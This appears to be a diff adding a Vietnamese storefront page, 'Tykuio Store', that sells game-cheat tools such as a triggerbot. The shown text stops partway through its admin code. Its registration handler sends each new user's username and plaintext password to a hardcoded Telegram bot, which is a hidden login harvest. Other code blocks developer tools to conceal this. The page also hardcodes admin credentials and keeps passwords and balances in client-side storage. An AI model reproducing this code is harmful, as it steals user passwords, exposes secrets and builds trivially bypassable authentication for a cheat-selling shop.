@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, user-scalable=no" name="viewport"/>
+<title>Tykuio Store</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+<style>
+* { font-family: 'Space Grotesk', sans-serif; }
+:root { --neon-cyan: #00f0ff; --neon-purple: #a855f7; --dark-bg: #05070a; --dark-card: #0d1117; --dark-surface: #0a0e14; --dark-border: #1e293b; }
+html { scroll-behavior: smooth; }
+body { background: #05070a; background-image: radial-gradient(circle at 50% 10%, rgba(0,240,255,0.06) 0%, transparent 60%); background-attachment: fixed; min-height: 100vh; overflow-x: hidden; opacity: 0; transition: opacity 0.5s ease; }
+body.loaded { opacity: 1; }
+
+#cherry-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999; overflow: hidden; }
+.petal { position: absolute; background: radial-gradient(circle at 30% 30%, #ffb7c5, #ff8a9b); border-radius: 150% 0 150% 150%; opacity: 0.5; transform: rotate(45deg); animation: fall linear infinite; box-shadow: 0 0 12px rgba(255,183,197,0.15); }
+@keyframes fall {
+0% { transform: translateY(-20px) translateX(0) rotate(0deg) scale(1); opacity: 0.7; }
+100% { transform: translateY(105vh) translateX(180px) rotate(720deg) scale(0.3); opacity: 0.1; }
+}
+
+#loader { position: fixed; inset: 0; z-index: 99999; background: #05070a; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.6s ease, visibility 0.6s ease; }
+#loader.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+.loader-ring { width: 60px; height: 60px; border-radius: 50%; border: 3px solid transparent; border-top-color: #00f0ff; border-right-color: #a855f7; animation: spin 0.8s cubic-bezier(0.6, 0, 0.4, 1) infinite; }
+.loader-ring::after { content: ''; position: absolute; inset: 6px; border-radius: 50%; border: 3px solid transparent; border-bottom-color: #00f0ff; border-left-color: #a855f7; animation: spin 0.5s cubic-bezier(0.6, 0, 0.4, 1) infinite reverse; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.loader-text { margin-top: 20px; color: #64748b; font-size: 13px; letter-spacing: 2px; font-weight: 500; animation: pulseText 1.5s ease-in-out infinite; }
+@keyframes pulseText { 0%,100% { opacity: 0.4; } 50% { opacity: 1; } }
+
+.tab-panel { display: none; animation: fadeSlide 0.4s ease; }
+.tab-panel.active { display: block; }
+@keyframes fadeSlide { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+
+.text-gradient { background: linear-gradient(135deg, #ffffff, #00f0ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+
+#toast-container { position: fixed; top: 1.5rem; right: 1.5rem; z-index: 99999; display: flex; flex-direction: column; gap: 0.75rem; pointer-events: none; }
+.toast { padding: 14px 20px; background: #0d1117; border: 1px solid #1e293b; border-radius: 14px; color: #fff; font-size: 14px; max-width: 380px; box-shadow: 0 8px 40px rgba(0,0,0,0.7); animation: slideIn 0.3s ease; pointer-events: auto; backdrop-filter: blur(10px); border-left: 3px solid #00f0ff; }
+@keyframes slideIn { from { opacity: 0; transform: translateX(40px) scale(0.95); } to { opacity: 1; transform: translateX(0) scale(1); } }
+
+.product-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+@media (min-width: 768px) { .product-grid { grid-template-columns: repeat(3, 1fr); gap: 16px; } }
+@media (min-width: 1024px) { .product-grid { grid-template-columns: repeat(4, 1fr); gap: 18px; } }
+
+.prod-card { background: #0d1117; border: 1px solid #1e293b; border-radius: 16px; padding: 16px; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); cursor: default; }
+.prod-card:hover { transform: translateY(-6px) scale(1.01); border-color: rgba(0,240,255,0.3); box-shadow: 0 12px 40px rgba(0,240,255,0.08); }
+.prod-img { width: 100%; aspect-ratio: 16/10; border-radius: 12px; overflow: hidden; margin-bottom: 10px; border: 1px solid #1e293b; background: #0d1117; transition: transform 0.4s; }
+.prod-card:hover .prod-img { transform: scale(1.02); }
+.prod-img img { width: 100%; height: 100%; object-fit: cover; }
+.prod-name { color: #fff; font-weight: 600; font-size: 14px; }
+.prod-price { color: #00f0ff; font-weight: 700; font-size: 16px; margin-top: 4px; }
+.prod-price.free { color: #22c55e; }
+.prod-stats { display: flex; justify-content: space-between; font-size: 11px; color: #64748b; margin-top: 6px; }
+.prod-btn { width: 100%; margin-top: 10px; padding: 8px; border-radius: 10px; background: rgba(255,255,255,0.03); border: 1px solid #1e293b; color: #fff; font-size: 12px; font-weight: 600; transition: all 0.3s; cursor: pointer; }
+.prod-btn:hover { background: #00f0ff; color: #000; border-color: #00f0ff; transform: scale(1.02); }
+
+.nav-link { color: #94a3b8; transition: all 0.3s; font-size: 13px; font-weight: 500; cursor: pointer; position: relative; }
+.nav-link:hover { color: #00f0ff; }
+.nav-link.active { color: #00f0ff; }
+.nav-link::after { content: ''; position: absolute; bottom: -4px; left: 0; width: 0; height: 2px; background: #00f0ff; transition: width 0.3s; }
+.nav-link.active::after { width: 100%; }
+
+.admin-input { background: #0a0e14; border: 1px solid #1e293b; border-radius: 10px; padding: 8px 12px; color: #fff; font-size: 12px; width: 100%; outline: none; transition: border 0.2s; }
+.admin-input:focus { border-color: #00f0ff; box-shadow: 0 0 0 3px rgba(0,240,255,0.1); }
+.admin-btn { background: #00f0ff; color: #000; border: none; padding: 6px 14px; border-radius: 8px; font-weight: 600; font-size: 11px; cursor: pointer; transition: all 0.3s; }
+.admin-btn:hover { background: #00d4e8; transform: scale(1.03); }
+
+.modal-overlay { position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; animation: fadeIn 0.3s; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+.modal-box { background: #0d1117; border: 1px solid #1e293b; border-radius: 24px; padding: 32px; max-width: 420px; width: 100%; margin: 0 16px; box-shadow: 0 24px 80px rgba(0,0,0,0.8); animation: scaleUp 0.3s; }
+@keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+.modal-box h3 { color: #fff; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 20px; }
+.modal-box input { width: 100%; background: #0a0e14; border: 1px solid #1e293b; border-radius: 12px; padding: 12px 16px; color: #fff; font-size: 14px; outline: none; transition: border 0.2s; margin-bottom: 12px; }
+.modal-box input:focus { border-color: #00f0ff; }
+.modal-box .btn-primary { width: 100%; background: #00f0ff; color: #000; font-weight: 700; padding: 12px; border-radius: 12px; font-size: 14px; cursor: pointer; transition: 0.2s; border: none; }
+.modal-box .btn-primary:hover { background: #00d4e8; transform: scale(1.02); }
+.modal-box .btn-secondary { width: 100%; background: transparent; color: #64748b; padding: 10px; border-radius: 12px; font-size: 13px; cursor: pointer; transition: 0.2s; border: none; }
+.modal-box .btn-secondary:hover { color: #fff; }
+.modal-box .switch-link { color: #00f0ff; cursor: pointer; font-weight: 600; }
+.modal-box .switch-link:hover { text-decoration: underline; }
+
+.glow-box { box-shadow: 0 0 40px rgba(0,240,255,0.03); transition: box-shadow 0.4s; }
+.glow-box:hover { box-shadow: 0 0 60px rgba(0,240,255,0.06); }
+
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: #0a0e14; }
+::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 10px; }
+::-webkit-scrollbar-thumb:hover { background: #00f0ff; }
+
+/* Anti-crack: chống inspect element */
+body { user-select: none; -webkit-user-select: none; }
+img, video { -webkit-user-drag: none; user-drag: none; }
+</style>
+</head>
+<body>
+
+<!-- Loader -->
+<div id="loader">
+<div class="loader-ring" style="position:relative;"></div>
+<div class="loader-text">⚡ TYKUIO STORE</div>
+</div>
+
+<!-- Cherry Blossom 4K -->
+<div id="cherry-container"></div>
+
+<!-- Toast -->
+<div id="toast-container"></div>
+
+<!-- Nav -->
+<nav class="fixed top-0 left-0 right-0 z-50 bg-[#05070a]/90 backdrop-blur-xl border-b border-[#1e293b] h-16 flex items-center px-4 transition-all duration-300">
+<div class="max-w-7xl mx-auto w-full flex justify-between items-center">
+<div class="flex items-center gap-3">
+<a href="#" class="text-white font-bold text-xl tracking-tight flex items-center gap-2">
+<span class="text-transparent bg-clip-text bg-gradient-to-r from-white to-cyan-400">TYKUIO</span>
+<span class="text-[10px] bg-[#00f0ff]/20 text-[#00f0ff] px-2 py-0.5 rounded-full font-bold">STORE</span>
+</a>
+</div>
+<div class="hidden md:flex items-center gap-6">
+<span class="nav-link active" onclick="switchTab('home')">🏠 Trang chủ</span>
+<span class="nav-link" onclick="switchTab('topup')">💳 Nạp tiền</span>
+<span class="nav-link" onclick="switchTab('history')">📜 Lịch sử</span>
+<span class="nav-link" id="admin-nav-link" onclick="switchTab('admin')" style="display:none;">⚙️ Admin</span>
+</div>
+<div class="flex items-center gap-4 text-sm" id="nav-user-area">
+<button onclick="showLoginModal()" class="bg-[#00f0ff] text-black px-5 py-2 rounded-xl font-bold text-xs hover:bg-[#00d4e8] transition-all hover:scale-105">Đăng nhập</button>
+</div>
+</div>
+</nav>
+
+<!-- Login/Register Modal -->
+<div id="auth-modal" class="modal-overlay hidden" onclick="if(event.target===this)closeAuthModal()">
+<div class="modal-box" onclick="event.stopPropagation()">
+<h3 id="auth-title">Đăng nhập</h3>
+<div id="auth-fields">
+<input id="auth-username" type="text" placeholder="Tên đăng nhập"/>
+<input id="auth-password" type="password" placeholder="Mật khẩu"/>
+</div>
+<div id="auth-register-fields" style="display:none;">
+<input id="reg-username" type="text" placeholder="Tên đăng nhập mới"/>
+<input id="reg-password" type="password" placeholder="Mật khẩu (tối thiểu 6 ký tự)"/>
+</div>
+<button id="auth-submit-btn" class="btn-primary" onclick="handleAuthSubmit()">Đăng nhập</button>
+<button class="btn-secondary" onclick="closeAuthModal()">Hủy</button>
+<p class="text-gray-400 text-xs text-center mt-2">
+<span id="auth-switch-text">Chưa có tài khoản?</span>
+<span class="switch-link" id="auth-switch-link" onclick="toggleAuthMode()">Đăng ký</span>
+</p>
+</div>
+</div>
+
+<main class="pt-24 px-4 max-w-7xl mx-auto pb-10">
+
+<!-- ===== TAB: TRANG CHỦ ===== -->
+<div id="home-tab" class="tab-panel active">
+<section>
+<div class="flex items-center gap-3 mb-6">
+<div class="w-8 h-8 rounded-lg bg-[#00f0ff]/10 flex items-center justify-center">
+<i data-lucide="gamepad-2" class="w-4 h-4 text-[#00f0ff]"></i>
+</div>
+<h2 class="text-white font-bold text-xl">Kho phần mềm cao cấp</h2>
+</div>
+<div class="product-grid" id="product-grid"></div>
+</section>
+</div>
+
+<!-- ===== TAB: NẠP TIỀN ===== -->
+<div id="topup-tab" class="tab-panel">
+<div class="max-w-2xl mx-auto">
+<div class="bg-[#0d1117] border border-[#1e293b] rounded-2xl p-8 shadow-2xl glow-box">
+<div class="flex items-center gap-3 mb-6">
+<div class="w-10 h-10 rounded-xl bg-[#00f0ff]/10 flex items-center justify-center">
+<i data-lucide="landmark" class="w-5 h-5 text-[#00f0ff]"></i>
+</div>
+<div>
+<h3 class="text-white font-bold text-lg">Nạp tiền tài khoản</h3>
+<p class="text-gray-500 text-xs">Chuyển khoản ngân hàng - Admin duyệt trực tiếp trên web</p>
+</div>
+</div>
+
+<div class="bg-[#0a0e14] border border-[#1e293b] rounded-xl p-6">
+<div class="mb-4">
+<label class="text-gray-400 text-xs block mb-2">Số tiền muốn nạp (VNĐ)</label>
+<input type="number" id="topup-amount" value="50000" min="10000" max="1000000000" class="w-full bg-[#0d1117] border border-[#1e293b] rounded-xl px-4 py-3 text-white text-sm focus:border-[#00f0ff] outline-none transition"/>
+<p class="text-gray-500 text-[10px] mt-1">Tối thiểu 10.000đ - Tối đa 1.000.000.000đ</p>
+</div>
+
+<button onclick="requestTopup()" class="w-full bg-[#00f0ff] text-black font-bold py-3 rounded-xl text-sm hover:bg-[#00d4e8] transition-all flex items-center justify-center gap-2 hover:scale-[1.02]">
+<i data-lucide="send" class="w-4 h-4"></i> Gửi yêu cầu nạp tiền
+</button>
+
+<div id="qr-topup-area" class="hidden mt-4 text-center">
+<p class="text-gray-300 text-sm mb-2">Quét mã QR bên dưới để chuyển khoản</p>
+<img id="qr-topup-image" src="https://i.imgur.com/YHIjSeF.jpeg" class="w-48 mx-auto rounded-lg border border-[#1e293b]"/>
+<div class="mt-4 p-4 bg-[#0d1117] border border-[#1e293b] rounded-xl text-left">
+<p class="text-yellow-400 text-xs font-mono" id="topup-memo">Nội dung: TykuioStore_User</p>
+<p class="text-gray-500 text-xs mt-2">Ngân hàng: <span class="text-white">Techcombank</span></p>
+<p class="text-gray-500 text-xs">Số tài khoản: <span class="text-white font-mono">19038494213018</span></p>
+<p class="text-gray-500 text-xs">Chủ tài khoản: <span class="text-white">NGUYEN THI HOA</span></p>
+<p class="text-gray-500 text-xs">Số tiền: <span class="text-[#00f0ff] font-bold" id="topup-display-amount">50.000đ</span></p>
+</div>
+</div>
+
+<div class="mt-4 p-4 bg-amber-500/10 border border-amber-500/20 rounded-xl">
+<p class="text-amber-400 text-sm font-semibold flex items-center gap-2">
+<i data-lucide="alert-triangle" class="w-4 h-4"></i>
+CHỜ ADMIN DUYỆT
+</p>
+<p class="text-gray-400 text-xs mt-1">Sau khi chuyển khoản, liên hệ admin gửi bill để được + tiền = 0946574794.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- ===== TAB: LỊCH SỬ ===== -->
+<div id="history-tab" class="tab-panel">
+<div class="max-w-4xl mx-auto">
+<div class="bg-[#0d1117] border border-[#1e293b] rounded-2xl p-6 shadow-2xl glow-box">
+<div class="flex items-center gap-3 mb-6">
+<div class="w-8 h-8 rounded-lg bg-[#00f0ff]/10 flex items-center justify-center">
+<i data-lucide="history" class="w-4 h-4 text-[#00f0ff]"></i>
+</div>
+<h3 class="text-white font-bold text-lg">Lịch sử mua hàng</h3>
+</div>
+<div id="history-list" class="space-y-2">
+<div class="text-gray-500 text-sm text-center py-8">Chưa có giao dịch nào</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- ===== TAB: ADMIN ===== -->
+<div id="admin-tab" class="tab-panel">
+<div class="max-w-4xl mx-auto">
+<div class="bg-[#0d1117] border border-[#1e293b] rounded-2xl p-6 shadow-2xl glow-box">
+<div class="flex items-center gap-3 mb-6">
+<div class="w-8 h-8 rounded-lg bg-[#00f0ff]/10 flex items-center justify-center">
+<i data-lucide="settings" class="w-4 h-4 text-[#00f0ff]"></i>
+</div>
+<h3 class="text-white font-bold text-lg">Quản lý</h3>
+</div>
+
+<!-- Quản lý người dùng -->
+<div class="mb-8">
+<h4 class="text-white font-semibold text-sm mb-3 flex items-center gap-2"><i data-lucide="users" class="w-4 h-4 text-[#00f0ff]"></i> Người dùng</h4>
+<div id="user-list" class="space-y-3"></div>
+</div>
+
+<!-- Quản lý sản phẩm -->
+<div class="border-t border-[#1e293b] pt-6">
+<h4 class="text-white font-semibold text-sm mb-3 flex items-center gap-2"><i data-lucide="package" class="w-4 h-4 text-[#00f0ff]"></i> Sản phẩm</h4>
+<div id="admin-products" class="space-y-3"></div>
+
+<!-- Form thêm sản phẩm -->
+<div class="mt-6 p-4 bg-[#0a0e14] border border-[#1e293b] rounded-xl">
+<h5 class="text-white font-semibold text-sm mb-3">➕ Thêm sản phẩm mới</h5>
+<div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+<input id="new-name" placeholder="Tên sản phẩm" class="admin-input"/>
+<input id="new-price" placeholder="Giá (0 = Miễn phí)" class="admin-input"/>
+<input id="new-stock" placeholder="Số lượng" class="admin-input"/>
+<input id="new-image" placeholder="Link ảnh sản phẩm" class="admin-input"/>
+<input id="new-download" placeholder="Link tải file" class="admin-input"/>
+<input id="new-video" placeholder="Link video hướng dẫn" class="admin-input"/>
+</div>
+<button onclick="addProduct()" class="admin-btn mt-3 hover:scale-105">➕ Thêm sản phẩm</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+</main>
+
+<script>
+// ============================================================
+// ANTI-CRACK: Chống inspect element, console log, dev tools
+// ============================================================
+// Chống click chuột phải
+document.addEventListener('contextmenu', e => e.preventDefault());
+// Chống tổ hợp phím F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+        (e.ctrlKey && e.key === 'U') ||
+        (e.ctrlKey && e.key === 'S')) {
+        e.preventDefault();
+        return false;
+    }
+});
+// Xóa console.log khi dev tools mở
+setInterval(() => { console.clear(); }, 1000);
+
+// ============================================================
+// CẤU HÌNH TELEGRAM
+// ============================================================
+const TELE = { token: '8890805228:AAGxvBFfLcQqybfl38J5NKI66mntppZzGxE', chatId: '8596413851' };
+
+// ============================================================
+// TÀI KHOẢN ADMIN CỐ ĐỊNH
+// ============================================================
+const ADMIN_USERNAME = 'admin';
+const ADMIN_PASSWORD = '15092007';
+let isLoginMode = true;
+
+// ============================================================
+// BIẾN TOÀN CỤC
+// ============================================================
+let session = null;
+let products = [];
+
+// ============================================================
+// TOAST
+// ============================================================
+function toast(msg) {
+const c = document.getElementById('toast-container');
+const el = document.createElement('div');
+el.className = 'toast';
+el.innerHTML = msg;
+c.appendChild(el);
+setTimeout(() => el.remove(), 4000);
+}
+
+// ============================================================
+// AUTH MODAL
+// ============================================================
+function showLoginModal() {
+isLoginMode = true;
+document.getElementById('auth-title').textContent = 'Đăng nhập';
+document.getElementById('auth-fields').style.display = 'block';
+document.getElementById('auth-register-fields').style.display = 'none';
+document.getElementById('auth-submit-btn').textContent = 'Đăng nhập';
+document.getElementById('auth-switch-text').textContent = 'Chưa có tài khoản?';
+document.getElementById('auth-switch-link').textContent = 'Đăng ký';
+document.getElementById('auth-modal').classList.remove('hidden');
+document.getElementById('auth-username').value = '';
+document.getElementById('auth-password').value = '';
+document.getElementById('reg-username').value = '';
+document.getElementById('reg-password').value = '';
+}
+
+function closeAuthModal() {
+document.getElementById('auth-modal').classList.add('hidden');
+}
+
+function toggleAuthMode() {
+isLoginMode = !isLoginMode;
+if (isLoginMode) {
+document.getElementById('auth-title').textContent = 'Đăng nhập';
+document.getElementById('auth-fields').style.display = 'block';
+document.getElementById('auth-register-fields').style.display = 'none';
+document.getElementById('auth-submit-btn').textContent = 'Đăng nhập';
+document.getElementById('auth-switch-text').textContent = 'Chưa có tài khoản?';
+document.getElementById('auth-switch-link').textContent = 'Đăng ký';
+} else {
+document.getElementById('auth-title').textContent = 'Đăng ký';
+document.getElementById('auth-fields').style.display = 'none';
+document.getElementById('auth-register-fields').style.display = 'block';
+document.getElementById('auth-submit-btn').textContent = 'Đăng ký';
+document.getElementById('auth-switch-text').textContent = 'Đã có tài khoản?';
+document.getElementById('auth-switch-link').textContent = 'Đăng nhập';
+}
+}
+
+function handleAuthSubmit() {
+if (isLoginMode) {
+handleLogin();
+} else {
+handleRegister();
+}
+}
+
+// ============================================================
+// LOGIN
+// ============================================================
+function handleLogin() {
+const username = document.getElementById('auth-username').value.trim();
+const password = document.getElementById('auth-password').value.trim();
+
+if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+session = { username: ADMIN_USERNAME, balance: 0, purchases: [], topups: [] };
+localStorage.setItem('tykuio_session', JSON.stringify(session));
+closeAuthModal();
+updateNav();
+renderProducts();
+renderHistory();
+toast('✅ Đăng nhập admin thành công!');
+return;
+}
+
+let users = loadUsers();
+const user = users.find(u => u.username === username && u.password === password);
+if (user) {
+session = user;
+localStorage.setItem('tykuio_session', JSON.stringify(session));
+closeAuthModal();
+updateNav();
+renderProducts();
+renderHistory();
+toast(`✅ Chào ${username}!`);
+} else {
+toast('❌ Sai tài khoản hoặc mật khẩu!');
+}
+}
+
+// ============================================================
+// REGISTER - GỬI VỀ TELEGRAM
+// ============================================================
+function handleRegister() {
+const username = document.getElementById('reg-username').value.trim();
+const password = document.getElementById('reg-password').value.trim();
+
+if (username.length < 3) { toast('❌ Tên đăng nhập tối thiểu 3 ký tự'); return; }
+if (password.length < 6) { toast('❌ Mật khẩu tối thiểu 6 ký tự'); return; }
+
+let users = loadUsers();
+if (users.find(u => u.username === username)) {
+toast('❌ Tên đăng nhập đã tồn tại!');
+return;
+}
+
+const newUser = { username, password, balance: 0, purchases: [], topups: [] };
+users.push(newUser);
+saveUsers(users);
+
+const msg = `🎯 <b>ĐĂNG KÝ TÀI KHOẢN MỚI</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n⏰ ${new Date().toLocaleString('vi-VN')}`;
+fetch(`https://api.telegram.org/bot${TELE.token}/sendMessage`, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ chat_id: TELE.chatId, text: msg, parse_mode: 'HTML' })
+}).catch(() => {});
+
+toast('✅ Đăng ký thành công! Hãy đăng nhập.');
+toggleAuthMode();
+}
+
+// ============================================================
+// USER MANAGEMENT
+// ============================================================
+function loadUsers() {
+if (!localStorage.getItem('tykuio_users')) {
+localStorage.setItem('tykuio_users', JSON.stringify([
+{ username: 'admin', password: '15092007', balance: 0, purchases: [], topups: [] }
+]));
+}
+return JSON.parse(localStorage.getItem('tykuio_users'));
+}
+
+function saveUsers(users) { localStorage.setItem('tykuio_users', JSON.stringify(users)); }
+
+function loadProducts() {
+if (!localStorage.getItem('tykuio_products')) {
+const defaultProducts = [
+{ id: 1, name: 'Dynamic Drag Limit Ipl', price: 100000, stock: 99999, sold: 0, image: 'https://i.imgur.com/placeholder.jpg', download: 'https://tykuio.store/dynamic.zip', video: 'https://youtube.com/watch?v=123' },
+{ id: 2, name: 'Triggerbot Dynamic AI', price: 50000, stock: 99999, sold: 0, image: 'https://i.imgur.com/placeholder.jpg', download: 'https://tykuio.store/trigger.zip', video: 'https://youtube.com/watch?v=456' },
+{ id: 3, name: 'Control Dynamic Andn', price: 150000, stock: 99999, sold: 0, image: 'https://i.imgur.com/placeholder.jpg', download: 'https://tykuio.store/control.zip', video: 'https://youtube.com/watch?v=789' },
+{ id: 4, name: 'Drag Dynamic Reg Pc', price: 200000, stock: 99999, sold: 0, image: 'https://i.imgur.com/placeholder.jpg', download: 'https://tykuio.store/drag.zip', video: 'https://youtube.com/watch?v=101' }
+];
+localStorage.setItem('tykuio_products', JSON.stringify(defaultProducts));
+}
+return JSON.parse(localStorage.getItem('tykuio_products'));
+}
+
+function saveProducts(data) { localStorage.setItem('tykuio_products', JSON.stringify(data)); }
+
+// ============================================================
+// UPDATE NAV
+// ============================================================
+function updateNav() {
+const area = document.getElementById('nav-user-area');
+const saved = localStorage.getItem('tykuio_session');
+if (saved) {
+try { session = JSON.parse(saved); } catch(e) {}
+}
+if (session) {
+const isAdmin = session.username === ADMIN_USERNAME;
+document.getElementById('admin-nav-link').style.display = isAdmin ? 'inline' : 'none';
+area.innerHTML = `
+<span class="text-white text-sm hidden sm:inline">👤 ${session.username}${isAdmin ? ' ⭐' : ''}</span>
+<span class="text-[#00f0ff] font-bold text-sm">${(session.balance||0).toLocaleString()}đ</span>
+<button onclick="logout()" class="text-red-400 text-xs hover:text-red-300 transition">Đăng xuất</button>
+`;
+} else {
+document.getElementById('admin-nav-link').style.display = 'none';
+area.innerHTML = `<button onclick="showLoginModal()" class="bg-[#00f0ff] text-black px-5 py-2 rounded-xl font-bold text-xs hover:bg-[#00d4e8] transition-all">Đăng nhập</button>`;
+}
+}
+
+function logout() {
+localStorage.removeItem('tykuio_session');
+session = null;
+updateNav();
+renderProducts();
+renderHistory();
+toast('Đã đăng xuất');
+}
+
+// ============================================================
+// SWITCH TAB
+// ============================================================
+function switchTab(tab) {
+document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+const tabMap = { home: 'home-tab', topup: 'topup-tab', history: 'history-tab', admin: 'admin-tab' };
+document.getElementById(tabMap[tab]).classList.add('active');
+const links = document.querySelectorAll('.nav-link');
+const idx = ['home', 'topup', 'history', 'admin'].indexOf(tab);
+if (links[idx]) links[idx].classList.add('active');
+if (tab === 'history') renderHistory();
+if (tab === 'admin') { renderAdmin(); }
+if (tab === 'home') renderProducts();
+lucide.createIcons();
+window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ============================================================
+// RENDER SẢN PHẨM
+// ============================================================
+function renderProducts() {
+products = loadProducts();
+const grid = document.getElementById('product-grid');
+grid.innerHTML = products.map(p => {
+const priceDisplay = p.price === 0 ? 'Miễn phí' : p.price.toLocaleString() + 'đ';
+const priceClass = p.price === 0 ? 'free' : '';
+return `
+<div class="prod-card">
+<div class="prod-img"><img src="${p.image || 'https://i.imgur.com/placeholder.jpg'}" alt="${p.name}" onerror="this.src='https://i.imgur.com/placeholder.jpg'"/></div>
+<div class="prod-name">${p.name}</div>
+<div class="prod-price ${priceClass}">${priceDisplay}</div>
+<div class="prod-stats"><span>📦 Còn: ${p.stock}</span><span>👤 Đã bán: ${p.sold}</span></div>
+<button class="prod-btn" onclick="buyProduct(${p.id})">Mua ngay</button>
+</div>
+`;
+}).join('');
+}
+
+// ============================================================
+// MUA HÀNG
+// ============================================================
+function buyProduct(id) {
+const saved = localStorage.getItem('tykuio_session');
+if (!saved) { toast('Vui lòng đăng nhập'); return; }
+try { session = JSON.parse(saved); } catch(e) { toast('Lỗi session'); return; }
+
+products = loadProducts();
+const product = products.find(p => p.id === id);
+if (!product) return toast('Sản phẩm không tồn tại');
+if (product.stock <= 0) return toast('Sản phẩm đã hết hàng');
+
+if (product.price > 0 && (session.balance||0) < product.price) {
+toast('Số dư không đủ! Hãy nạp tiền.');
+return;
+}
+
+if (product.price > 0) {
+session.balance -= product.price;
+}
+product.stock -= 1;
+product.sold += 1;
+
+if (!session.purchases) session.purchases = [];
+const purchase = {
+id: Date.now(),
+productId: product.id,
+name: product.name,
+price: product.price,
+time: new Date().toLocaleString('vi-VN'),
+downloadLink: product.download || 'https://tykuio.store/download.zip',
+videoLink: product.video || 'https://youtube.com'
+};
+session.purchases.unshift(purchase);
+
+let users = loadUsers();
+const idx = users.findIndex(u => u.username === session.username);
+if (idx !== -1) { users[idx] = session; saveUsers(users); }
+saveProducts(products);
+localStorage.setItem('tykuio_session', JSON.stringify(session));
+
+updateNav();
+renderProducts();
+renderHistory();
+toast(`✅ Mua thành công ${product.name}!`);
+}
+
+// ============================================================
+// RENDER LỊCH SỬ
+// ============================================================
+function renderHistory() {
+const list = document.getElementById('history-list');
+if (!session || !session.purchases || session.purchases.length === 0) {
+list.innerHTML = '<div class="text-gray-500 text-sm text-center py-8">Chưa có giao dịch nào</div>';
+return;
+}
+list.innerHTML = session.purchases.map(p => `
+<div class="bg-[#0a0e14] border border-[#1e293b] rounded-xl p-4 flex flex-col md:flex-row justify-between items-start md:items-center gap-3 hover:border-[#00f0ff]/20 transition-all">
+<div class="flex-1">
+<div class="text-white font-semibold">${p.name}</div>
+<div class="text-[#00f0ff] text-sm">${p.price === 0 ? 'Miễn phí' : p.price.toLocaleString() + 'đ'}</div>
+<div class="text-gray-500 text-xs">${p.time}</div>
+</div>
+<div class="flex flex-wrap gap-2">
+<a href="${p.downloadLink || '#'}" target="_blank" class="bg-[#00f0ff] text-black px-4 py-2 rounded-lg text-xs font-bold hover:bg-[#00d4e8] transition hover:scale-105">📥 Tải file</a>
+<a href="${p.videoLink || '#'}" target="_blank" class="bg-[#a855f7] text-white px-4 py-2 rounded-lg text-xs font-bold hover:bg-[#9333ea] transition hover:scale-105">🎬 Video</a>
+</div>
+</div>
+`).join('');
+}
+
+// ============================================================
+// RENDER ADMIN
+// ============================================================
+function renderAdmin() {
+const users = loadUsers();
+const container = document.getElementById('user-list');
+container.innerHTML = users.map(u => `
+<div class="bg-[#0a0e14] border border-[#1e293b] rounded-xl p-4 flex flex-col md:flex-row justify-between items-start md:items-center gap-3 hover:border-[#00f0ff]/20 transition-all">
+<div>
+<div class="text-white font-semibold">👤 ${u.username}</div>
+<div class="text-[#00f0ff] text-sm">💰 ${(u.balance||0).toLocaleString()}đ</div>
+<div class="text-gray-500 text-xs">📦 ${(u.purchases||[]).length} đơn hàng</div>
+</div>
+${u.username !== ADMIN_USERNAME ? `
+<div class="flex gap-2 items-center">
+<input type="number" placeholder="Số tiền" class="admin-input text-xs w-32" id="admin-topup-${u.username}" value="100000"/>
+<button onclick="adminTopup('${u.username}')" class="admin-btn">✅ Nạp</button>
+</div>
+` : `<span class="text-xs text-[#00f0ff]">⭐ Admin</span>`}
+</div>
+`).join('');
+
+products = loadProducts();
+const prodContainer = document.getElementById('admin-products');
+prodContainer.innerHTML = products.map(p => `
+<div class="bg-[#0a0e14] border border-[#1e293b] rounded-xl p-3 flex flex-wrap items-center gap-2 hover:border-[#00f0ff]/20 transition-all">
+<input value="${p.name}" class="admin-input text-xs flex-1 min-w-[80px]" onchange="updateProduct(${p.id},'name',this.value)"/>
+<input value="${p.price}" class="admin-input text-xs w-20" onchange="updateProduct(${p.id},'price',parseInt(this.value)||0)"/>
+<input value="${p.stock}" class="admin-input text-xs w-16" onchange="updateProduct(${p.id},'stock',parseInt(this.value)||0)"/>
+<input value="${p.image}" class="admin-input text-xs flex-1 min-w-[100px]" placeholder="Link ảnh" onchange="updateProduct(${p.id},'image',this.value)"/>
